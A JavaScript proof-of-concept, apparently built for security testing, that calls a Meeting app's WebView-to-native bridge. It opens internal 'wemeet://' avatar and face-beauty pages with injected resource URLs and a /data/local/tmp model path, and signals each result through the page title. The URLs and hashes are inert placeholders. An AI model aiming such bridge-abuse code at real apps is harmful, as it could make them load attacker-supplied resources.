(function() {
  document.title = 'P87PAY:' + location.host;
  window.__p87cb = function(raw) {
    var r = raw;
    try { r = typeof raw === 'string' ? JSON.parse(raw) : raw; } catch (_) {}
    try {
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module: 'CommonPlugin', method: 'PrintLog',
        param: {log: 'P87CB=' + JSON.stringify(r)}, callId: 'P87LOG'
      }));
    } catch (_) {}
    document.title = 'P87CB:' + String(r && r.callId) + ':' + String(r && r.code);
  };

  function call(id, module, method, param) {
    document.title = 'P87RUN:' + id;
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback: 'window.__p87cb', module: module, method: method,
      param: param, callId: id
    }));
  }

  var invalidUrl = 'https://example.invalid/p87-avatar.zip';
  var invalidMd5 = '11111111111111111111111111111111';
  var routes = [
    ['H2', 'CommonPlugin', 'GetPerformance', {}],
    ['A1', 'CommonPlugin', 'OpenNewPage', {
      scheme: 'wemeet://page/ar_avatar_setting',
      router_params: {
        model_resource_url: invalidUrl, model_resource_md5: invalidMd5,
        resource_url: invalidUrl, resource_md5: invalidMd5,
        avatar_model_path: '/data/local/tmp/p87-avatar', abi_path: 'arm64-v8a',
        from_webView: true
      }
    }],
    ['A2', 'CommonPlugin', 'OpenNewPage', {
      scheme: 'wemeet://page/ar_avatar_setting?model_resource_url=' + encodeURIComponent(invalidUrl)
        + '&model_resource_md5=' + invalidMd5,
      router_params: {
        model_resource_url: invalidUrl, model_resource_md5: invalidMd5,
        from_webView: true
      }
    }],
    ['F1', 'CommonPlugin', 'OpenNewPage', {
      scheme: 'wemeet://page/facebeauty',
      router_params: {
        avatar_model_path: '/data/local/tmp/p87-avatar', abi_path: 'arm64-v8a',
        from_webView: true
      }
    }],
    ['F2', 'CommonPlugin', 'OpenNewPage', {
      scheme: 'wemeet://page/inmeeting/setting/facebeauty',
      router_params: {
        model_resource_url: invalidUrl, model_resource_md5: invalidMd5,
        from_webView: true
      }
    }]
  ];

  var i = 0;
  function next() {
    if (i >= routes.length) {
      document.title = 'P87-DONE:' + location.host;
      return;
    }
    var x = routes[i++];
    call(x[0], x[1], x[2], x[3]);
    setTimeout(next, 5000);
  }

  if (!window.JSCallJavaMgr) {
    document.title = 'P87-NOBRIDGE:' + location.host;
    return;
  }
  setTimeout(next, 1000);
})();
